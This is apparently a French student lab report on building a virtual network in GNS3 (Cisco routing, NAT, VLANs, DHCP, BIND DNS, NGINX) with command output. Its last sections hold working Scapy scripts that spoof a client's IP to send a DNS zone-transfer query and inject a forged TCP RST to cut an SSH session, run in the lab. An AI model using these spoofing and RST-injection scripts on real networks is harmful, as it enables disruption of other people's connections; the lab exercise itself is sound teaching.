
3. Marche à suivre

A. Juste les adresses IP
➜ Branchez tous les équipements dans GNS3

➜ Configurez d'abord les routeurs

DHCP
~~~
R3#show ip int br
R3#conf t
R3(config)#interface fastEthernet0/0
R3(config-if)#ip address dhcp
R3(config-if)#no shut
R3(config-if)#exit
R3(config)#exit
R3#show ip int br
Interface                  IP-Address      OK? Method Status                Protocol
FastEthernet0/0            192.168.122.25  YES DHCP   up                    up  
FastEthernet0/1            unassigned      YES unset  administratively down down
FastEthernet1/0            unassigned      YES unset  administratively down down
FastEthernet2/0            unassigned      YES unset  administratively down down
~~~
routeur1
~~~
R3#conf t
R3(config-if)#interface fastEthernet0/1
R3(config-if)#ip address 10.3.12.1 255.255.255.252
R3(config-if)#no shut
R3(config-if)#interface fastEthernet1/0
R3(config-if)#ip address 10.3.1.254 255.255.255.0
R3(config-if)#no shut
R3(config-if)#exit
R3(config)#exit

R3#show ip int br
Interface                  IP-Address      OK? Method Status                Protocol
FastEthernet0/0            192.168.122.23  YES DHCP   up                    up  
FastEthernet0/1            10.3.12.1       YES manual up                    up  
FastEthernet1/0            10.3.1.254      YES manual up                    up  
FastEthernet2/0            unassigned      YES unset  administratively down down
~~~
routeur2
~~~
...
R4#show ip int br
Interface                  IP-Address      OK? Method Status                Protocol
FastEthernet0/0            unassigned      YES unset  administratively down down
FastEthernet0/1            10.3.12.2       YES manual up                    up  
FastEthernet1/0            10.3.2.254      YES manual up                    up  
FastEthernet2/0            unassigned      YES unset  administratively down down
~~~
VPCS
~~~
PC1> ip 10.3.1.1
Checking for duplicate address...
PC1 : 10.3.1.1 255.255.255.0

PC1> save
Saving startup configuration to startup.vpc
.  done
...
~~~
➜ Tests de ping
~~~
R3#ping 10.3.12.2

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.12.2, timeout is 2 seconds:
.!!!!
Success rate is 80 percent (4/5), round-trip min/avg/max = 40/56/64 ms


R4#ping 10.3.12.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.12.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 60/61/64 ms

~~~
les routeurs doivent se ping sur leur interface en /30

les clients doivent ping le routeur de leur réseau
~~~
PC1> ping 10.3.1.254

84 bytes from 10.3.1.254 icmp_seq=1 ttl=255 time=8.263 ms
84 bytes from 10.3.1.254 icmp_seq=2 ttl=255 time=6.569 ms
84 bytes from 10.3.1.254 icmp_seq=3 ttl=255 time=4.654 ms


PC3> ping 10.3.2.254

84 bytes from 10.3.2.254 icmp_seq=1 ttl=255 time=9.432 ms
84 bytes from 10.3.2.254 icmp_seq=2 ttl=255 time=10.589 ms
84 bytes from 10.3.2.254 icmp_seq=3 ttl=255 time=12.265 ms

~~~
Routes:
~~~
R3(config)#ip route 10.3.2.0 255.255.255.0 10.3.12.2
R4(config)#ip route 10.3.1.0 255.255.255.0 10.3.12.1

PC1>ip 10.3.1.1 255.255.255.0 10.3.1.254
pc2>ip 10.3.1.2 255.255.255.0 10.3.1.254
PC3> ip 10.3.2.1 255.255.255.0 10.3.2.254
PC4> ip 10.3.2.2 255.255.255.0 10.3.2.254
~~~
➜ Tests de ping
~~~
PC4> ping 10.3.1.1
84 bytes from 10.3.1.1 icmp_seq=1 ttl=62 time=37.908 ms

PC1> ping 10.3.2.1
84 bytes from 10.3.2.1 icmp_seq=1 ttl=62 time=50.712 ms

R3#ping 10.3.2.0
Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.2.0, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 60/69/84 ms

R4#ping 10.3.1.0
Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.0, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 60/62/68 ms
~~~
🌞 ping d'un client du  LAN1 vers un client du LAN 2
~~~
R4#ping 10.3.1.0
Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.0, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 60/62/68 ms
~~~
🌞 Capture Wireshark ping_partie1

cf [ping_partie](https://github.com/Ashiibi/Virtualisation/blob/main/tp3/ping_partie1.pcapng)

🌞 Afficher les adresses MAC des routeurs
~~~
R3#show arp
Protocol  Address          Age (min)  Hardware Addr   Type   Interface
Internet  10.3.12.1               -   c401.0739.0001  ARPA   FastEthernet0/1
Internet  192.168.122.23          -   c401.0739.0000  ARPA   FastEthernet0/0
Internet  10.3.12.2              48   c402.0757.0001  ARPA   FastEthernet0/1
Internet  10.3.1.1               18   0050.7966.6800  ARPA   FastEthernet1/0
Internet  10.3.1.2               11   0050.7966.6801  ARPA   FastEthernet1/0
Internet  192.168.122.1           1   5254.0023.04c2  ARPA   FastEthernet0/0
Internet  10.3.1.254              -   c401.0739.0010  ARPA   FastEthernet1/0

R4#show arp
Protocol  Address          Age (min)  Hardware Addr   Type   Interface
Internet  10.3.12.1              45   c401.0739.0001  ARPA   FastEthernet0/1
Internet  10.3.12.2               -   c402.0757.0001  ARPA   FastEthernet0/1
Internet  10.3.2.2                9   0050.7966.6803  ARPA   FastEthernet1/0
Internet  10.3.2.1               18   0050.7966.6802  ARPA   FastEthernet1/0
Internet  10.3.2.254              -   c402.0757.0010  ARPA   FastEthernet1/0
~~~
~~~
PC1> ping 10.3.2.254

84 bytes from 10.3.2.254 icmp_seq=1 ttl=254 time=25.597 ms
84 bytes from 10.3.2.254 icmp_seq=2 ttl=254 time=12.404 ms

PC3> ping 10.3.1.254

84 bytes from 10.3.1.254 icmp_seq=1 ttl=254 time=29.425 ms
~~~
C. Accès internet
➜ Déjà accès internet ?
🌞 Prouvez que vous avez déjà un accès internet sur r1
~~~
R3#ping 8.8.8.8

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 8.8.8.8, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 88/122/256 ms

~~~
➜ Configurer r1 pour qu'il fasse du NAT
~~~
R3#conf t
Enter configuration commands, one per line.  End with CNTL/Z.
R3(config)#interface fastEthernet 0/0
R3(config-if)#ip nat outside
R3(config-if)#no shut
R3(config-if)#exit
R3(config)#interface fastEthernet 0/1
R3(config-if)#ip nat inside
R3(config-if)#no shut
R3(config-if)#exit
R3(config)#interface fastEthernet 1/0
R3(config-if)#ip nat inside
R3(config-if)#no shut
R3(config-if)#exit
R3(config)#exit

R3(config)#access-list 1 permit any
R3(config)#ip nat inside source list 1 interface fastEthernet 0/0 overload
~~~
🌞 Accès internet LAN1
~~~
PC1> ping 8.8.8.8

84 bytes from 8.8.8.8 icmp_seq=1 ttl=110 time=270.440 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=110 time=73.241 ms


PC2> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=50 time=124.121 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=50 time=45.270 ms
~~~
➜ Accès internet pour le deuxième LAN maintenant

ajouter une route par défaut sur r2 (mémo Cisco again)
cette route doit indiquer que r1 est la passerelle par défaut
~~~
R4(config)#ip route 0.0.0.0 0.0.0.0 10.3.12.1
~~~

🌞 Accès internet LAN2

prouvez, depuis un client du LAN2 qu'il a un accès internet
cela ne peut fonctionner que si la passerelle du LAN2 (r2) connaît un chemin vers internet
et c'est le cas : on lui a ajouté une route par défaut
~~~
PC3> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=49 time=101.327 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=49 time=59.519 ms
~~~
➜ On configure les switches en premier
Access
~~~
(config)# vlan 10
(config-vlan)# name admins
(config-vlan)# exit

(config)# vlan 20
(config-vlan)# name guests
(config-vlan)# exit

(config)# vlan 30
(config-vlan)# name servers
(config) show vlan
IOU1#show vlan br

VLAN Name                             Status    Ports
---- -------------------------------- --------- -------------------------------
1    default                          active    Et1/0, Et1/1, Et1/2, Et1/3
                                                Et2/0, Et2/1, Et2/2, Et2/3
                                                Et3/0, Et3/1, Et3/2, Et3/3
10   admins                           active    Et0/1
20   guests                           active    Et0/2
30   servers                          active
1002 fddi-default                     act/unsup
1003 token-ring-default               act/unsup
1004 fddinet-default                  act/unsup
1005 trnet-default                    act/unsup
~~~
On fait pareil pour le deuxieme switch...

Maintenant les Trunks
~~~
IOU1(config)#interface ethernet 0/0
IOU1(config-if)#switchport trunk encapsulation dot1q
IOU1(config-if)#switchport mode trunk
IOU1(config-if)#switchport trunk allowed vlan add 10,20,30
...

IOU1(config-if)#exit
IOU1(config)#exit
IOU1#show interfaces trunk
Port        Mode             Encapsulation  Status        Native vlan
Et0/0       on               802.1q         trunking      1
Et0/3       on               802.1q         trunking      1

Port        Vlans allowed on trunk
Et0/0       1-4094
Et0/3       1-4094

Port        Vlans allowed and active in management domain
Et0/0       1,10,20,30
Et0/3       1,10,20,30

Port        Vlans in spanning tree forwarding state and not pruned
Et0/0       1,10,20,30
Et0/3       1,10,20,30
~~~
~~~
IOU2#show interfaces trunk

Port        Mode             Encapsulation  Status        Native vlan
Et0/0       on               802.1q         trunking      1

Port        Vlans allowed on trunk
Et0/0       1-4094

Port        Vlans allowed and active in management domain
Et0/0       1,10,20,30

Port        Vlans in spanning tree forwarding state and not pruned
Et0/0       1,10,20,30
~~~

🌞 Tests de ping

une fois tous les VLANs en place, les membres d'un même VLAN sont autorisés à se ping

prouvez que client1 et client3 peuvent se ping

~~~
PC1> ping 10.3.1.2

84 bytes from 10.3.1.2 icmp_seq=1 ttl=64 time=2.077 ms
84 bytes from 10.3.1.2 icmp_seq=2 ttl=64 time=2.824 ms

PC3> ping 10.3.1.1

84 bytes from 10.3.1.1 icmp_seq=1 ttl=64 time=2.528 ms
84 bytes from 10.3.1.1 icmp_seq=2 ttl=64 time=2.936 ms
~~~

B. Routeur
➜ On passe sur le routeur

on a un soucis : le routeur a une seule interface qui doit servir de passerelle pour tous les LANs
il doit donc avoir plusieurs adresses IP sur une seule interface !
on fait ça avec des sous-interfaces :

on "découpe" l'interface en plusieurs sous-interfaces
chacune des sous-interfaces a une adresse IP
chaque sous-interface est définie comme étant dans un VLAN particulier



➜ Configuration IP du routeur

adresse IP DHCP côté nuage

R1#copy running-config startup-config
~~~
R1#show ip int br
Interface                  IP-Address      OK? Method Status                Protocol
FastEthernet0/0            192.168.122.32  YES DHCP   up                    up  
FastEthernet0/1            unassigned      YES unset  administratively down down
FastEthernet1/0            unassigned      YES unset  administratively down down
FastEthernet2/0            unassigned      YES unset  administratively down down
~~~

adresses IP sur les sous-interfaces qui pointent vers le LAN
n'oubliez pas d'allumer les interfaces
~~~
R1(config)#interface fastEthernet 0/1.10
R1(config-subif)#encapsulation dot1Q 10
R1(config-subif)#ip address 10.3.1.254 255.255.255.0
R1(config-subif)#exit

R1(config)#interface fastEthernet 0/1.20
R1(config-subif)#encapsulation dot1Q 20
R1(config-subif)#ip address 10.3.2.254 255.255.255.0
R1(config-subif)#exit

R1(config)#interface fastEthernet 0/1.30
R1(config-subif)#encapsulation dot1Q 30
R1(config-subif)#ip address 10.3.3.254 255.255.255.0
R1(config-subif)#exit

R1(config)#interface fastEthernet 0/1
R1(config-if)# no shut
R1(config-if)# exit
~~~
~~~
R1#show ip int br
Interface                  IP-Address      OK? Method Status                Protocol
FastEthernet0/0            192.168.122.32  YES DHCP   up                    up  
FastEthernet0/1            unassigned      YES NVRAM  up                    up  
FastEthernet0/1.10         10.3.1.254      YES manual up                    up  
FastEthernet0/1.20         10.3.2.254      YES manual up                    up  
FastEthernet0/1.30         10.3.3.254      YES manual up                    up  
FastEthernet1/0            unassigned      YES NVRAM  administratively down down
FastEthernet2/0            unassigned      YES NVRAM  administratively down down
~~~
🌞 Tests de ping   
le routeur peut ping tout le monde 
~~~
R1#ping  10.3.1.2

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.1.2, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 32/50/64 ms

R1#ping  10.3.2.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 10.3.2.1, timeout is 2 seconds:
.!!!!
Success rate is 80 percent (4/5), round-trip min/avg/max = 32/44/60 ms
~~~
le LAN1 et le LAN2 se ping

prouvez le avec un show ip suivi d'un ping sur un VPCS

~~~
PC3> show ip

NAME        : PC3[1]
IP/MASK     : 10.3.1.2/24
GATEWAY     : 10.3.1.254
DNS         :
MAC         : 00:50:79:66:68:02
LPORT       : 20024
RHOST:PORT  : 127.0.0.1:20025
MTU         : 1500

PC3> ping 10.3.2.1

10.3.2.1 icmp_seq=1 timeout
84 bytes from 10.3.2.1 icmp_seq=2 ttl=63 time=17.850 ms
84 bytes from 10.3.2.1 icmp_seq=3 ttl=63 time=14.539 ms

~~~
➜ Configuration du NAT

configurez du NAT sur le routeur pour que les clients aient un accès Internet

🌞 Tests de ping

le routeur peut ping internet
n'importe quel client a un accès internet
~~~ 
PC1> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=62 time=19.903 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=62 time=22.416 ms
~~~

III. Services dans le LAN
1. DHCP
➜ Configurez dhcp.tp3.b2 pour qu'il attribue des IPs aux clients de son réseau

(config classique, ajout d'une route pour avoir internet et ip statique.)

~~~
authoritative;
subnet 10.3.2.0 netmask 255.255.255.0{
	range 10.3.2.10 10.3.2.50;
	option broadcast-address 10.3.2.1;
	option routers 10.3.2.254;
   option domain-name-servers 1.1.1.1;
}
~~~
la range de votre choix
il doit indiquer la passerelle du réseau aux clients
il doit indiquer 1.1.1.1 commme serveur DNS aux clients

🌞 Prouvez avec un VPCS

un ptit ip dhcp qui fonctionne
suivi d'un show ip
et un ping efrei.fr qui fonctionne
~~~
PC4> ip dhcp
DORA IP 10.3.2.10/24 GW 10.3.2.254

PC4> show ip

NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 1.1.1.1
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 42754, 42757/21378/37412
DOMAIN NAME : efrei.fr
MAC         : 00:50:79:66:68:03
LPORT       : 20027
RHOST:PORT  : 127.0.0.1:20028
MTU         : 1500

PC4> ping efrei.fr
efrei.fr resolved to 51.255.68.208

84 bytes from 51.255.68.208 icmp_seq=1 ttl=54 time=42.155 ms
84 bytes from 51.255.68.208 icmp_seq=2 ttl=54 time=42.361 ms

~~~
1. DNS
➜ Configurez dns.tp3.b2 pour qu'il soir le serveur DNS du réseau

addressage statique avec route toussa toussa.

➜ Installer BIND sur la machine dns.tp3.b2

c'est un outil de référence
sur Rocky :

~~~
sudo dnf install bind bind-utils
~~~

➜ Configurer BIND

d'abord le fichier de conf principal : /etc/named.conf

~~~

## éditez le fichier de config principal pour qu'il ressemble à :
options {
        listen-on port 53 { 127.0.0.1; any; };
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
[...]
        allow-query     { localhost; any; };
        allow-query-cache { localhost; any; };

        recursion yes;
[...]
## référence vers notre fichier de zone
zone "tp3.b2" IN {
     type master;
     file "tp3.b2.db";
     allow-update { none; };
     allow-query {any; };
};
## référence vers notre fichier de zone inverse
zone "3.3.10.in-addr.arpa" IN {
     type master;
     file "tp3.b2.rev";
     allow-update { none; };
     allow-query { any; };
};
[...]


➜ Et pour les fichiers de zone

dans ces fichiers c'est le caractère ; pour les commentaires
hésitez pas à virer mes commentaires de façon générale
c'juste pour que vous captiez mais ça fait dégueu dans un fichier de conf


# Fichier de zone pour nom -> IP

$ sudo cat /var/named/tp3.b2.db

$TTL 86400
@ IN SOA dns.tp3.b2. admin.tp3.b2. (
    2019061800 ;Serial
    3600 ;Refresh
    1800 ;Retry
    604800 ;Expire
    86400 ;Minimum TTL
)

; Infos sur le serveur DNS lui même (NS = NameServer)
@ IN NS dns.tp3.b2.

; Enregistrements DNS pour faire correspondre des noms à des IPs
; on met quelques faux noms histoire de nourrir un peu le le fichier
web         IN A 10.3.3.3
supersite   IN A 10.3.3.3
web2        IN A 10.3.3.4
coolsite    IN A 10.3.3.4
web3        IN A 10.3.3.5
prout       IN A 10.3.3.5
web4        IN A 10.3.3.6
meow        IN A 10.3.3.6
dns         IN A 10.3.3.3



# Fichier de zone inverse pour IP -> nom

$ sudo cat /var/named/tp3.b2.rev

$TTL 86400
@ IN SOA dns.tp3.b2. admin.tp3.b2. (
    2019061800 ;Serial
    3600 ;Refresh
    1800 ;Retry
    604800 ;Expire
    86400 ;Minimum TTL
)

; Infos sur le serveur DNS lui même (NS = NameServer)
@ IN NS dns.tp3.b2.

; Reverse lookup
3 IN PTR web.tp3.b2.
4 IN PTR web2.tp3.b2.
5 IN PTR web3.tp3.b2.
6 IN PTR web4.tp3.b2.
~~~

➜ Une fois ces 3 fichiers en place, démarrez le service DNS
~~~
# Démarrez le service tout de suite
$ sudo systemctl start named

# Faire en sorte que le service démarre tout seul quand la VM s'allume
$ sudo systemctl enable named

# Obtenir des infos sur le service
$ sudo systemctl status named

# Obtenir des logs en cas de probème
$ sudo journalctl -xe -u named
~~~

➜ Modifier la configuration de dhcp.tp2.b3

désormais il doit indiquer l'adresse IP de dns.tp2.b3 comme serveur DNS

🌞 Tests résolutions DNS

vérifier qu'un client peut correctement récupérer une IP en DHCP
et il peut immédiatement ping efrei.fr ainsi que dns.tp2.b3
~~~
PC4> ping efrei.Fr
efrei.Fr resolved to 51.255.68.208

84 bytes from 51.255.68.208 icmp_seq=1 ttl=54 time=40.342 ms
84 bytes from 51.255.68.208 icmp_seq=2 ttl=54 time=43.960 ms

PC4> ping dns.tp3.b2
dns.tp3.b2 resolved to 10.3.3.3
~~~

🌞 Capture Wireshark

une capture Wireshark où on voit les deux requêtes DNS d'un de vos clients
ainsi que les réponses
vers les nom ping efrei.fr et dns.tp2.b3

[pingdns](https://github.com/Ashiibi/Virtualisation/blob/main/tp3/pingdns.pcapng)


3. HTTP

J'aurais pu appeler la partie juste "serveur Web" comme tout le monde, mais ça flex avec un beau sommaire à 3 acronymes hé.

➜ Enfin, on passe sur web.tp2.b3
➜ Installer et démarrer NGINX

un outil réputé, qui peut agir comme serveur Web
sur Rocky Linux :

~~~
# installation de NGINX
sudo dnf install -y nginx

# démarrage immédiat + au reboot de NGINX
sudo systemctl enable --now nginx

# on gère le port firewall qu'utilise NGINX
sudo firewall-cmd --add-port=80/tcp --permanent
sudo firewall-cmd --reload
~~~

🌞 Preuve avec un client
depuis une machine d'un autre LAN, visitez le site web
en utilisant le nom du serveur web.tp2.b3 et supersite.tp2.b3

vous pouvez ajouter une machine avec un navigateur Web si vous voulez
pour le compte-rendu, un simple curl suffira (requête HTTP en ligne de commande)
~~~
sacha@sacha# curl web.tp3.b2 | head
<!doctype html>
<head>
<meta name='viewport" content='width=device-width, initial-scale=1'>
<title>HTTP Server Test Page powered by: Rocky Linux</title>


sacha@sacha# curl supersite.tp3.b2 | head
<!doctype html>
<head>
<meta name='viewport" content='width=device-width, initial-scale=1'>
<title>HTTP Server Test Page powered by: Rocky Linux</title>
~~~

🌞 Requêter l'enregistrement AXFR

depuis la machine attaquante
vers le serveur dns.tp3.b2

pour la zone tp3.b2

~~~
root@efrei-xmg4agau1:/home/sacha# dig axft @10.3.3.1 tp3.b2

; << >> DiG 9.18.28-1~deb12u2-Debian << >> axft @10.3.3.1 tp3.b2
;; global options: +cmd
;; Got answer:
; ; ->>HEADER <<- opcode: QUERY, status: NXDOMAIN, id: 15347
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags :; udp: 1232
; COOKIE: 2669a0353688bd6401000000678012bcdf7ab668634f5ab3 (good)
[...]
~~~

🌞 Spoof DNS query

réussir à faire une requête DNS depuis la machine attaquante
en spoofant l'identité d'une autre machine
prouvez avec une capture Wireshark que la victime a reçu la réponse DNS*

~~~
from scapy.all import *

query = sr1(IP(dst="dns.tp3.b2", src="10.3.2.10")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="tp3.b2", qtype="AXFR")),verbose=0)

print(query[DNS].summary())
~~~
[spoofdns.pcapng](https://github.com/Ashiibi/Virtualisation/blob/main/tp3/dns_flood.pcapng)

🌞 Mettre en place une attaque TCP RST

il faut une connexion TCP établie dans le LAN
si vous visitez le site web avec un navigateur, un navigateur maintient la connexion TCP active un moment normalement (contrairement à curl)
vous pouvez aussi faire une connexion SSH entre deux machines par exemple, ce sera encore plus parlant et visible car la connexion SSH va couper d'un coup : c'est le but de l'attaque

envoyer un ou plusieurs paquets TCP RST pour terminer une connexion TCP en cours

il faut une connexion TCP en cours
il faut repérer les numéros de séquence
envoyer un TCP RST à un participant, en spoofant l'identité de l'autre
avec les bons numéros à l'intérieur
~~~
from scapy.all import *

ip_src = "10.3.3.1"
ip_dst = "10.3.3.2"
port_src = 56100
port_dst = 22

seq_num = 2819881537
ack_num = 3424035478

rst_packet = IP(src=ip_src, dst=ip_dst) / \
            TCP(sport=port_src, dport=port_dst, flags="R", seq=seq_num, ack=ack_num)

send(rst_packet)

print(f"Paquet RST envoyé de {ip_src}:{port_src} vers {ip_dst}:{port_dst} avec Seq={seq_num} et Ack={ack_num}")

~~~
~~~
root@sacha:~# python3 rst.py
ip src >> 10.3.3.1
ip dst >> 10.3.3.2
port src >> 56100
port dst >> 22
Seq nb >> 2819881537
Ack nb >> 3424035478
[ 3029.781295 ] device enp0s3 entered promiscuous mode
[ 3029.781295 ] device enp0s3 left promiscuous mode
attaquant@localhost:~$ aclient_loop: send disconnect: Broken pipe
~~~
[rst.pcapng](https://github.com/Ashiibi/Virtualisation/blob/main/tp3/tcp_rst.pcapng)
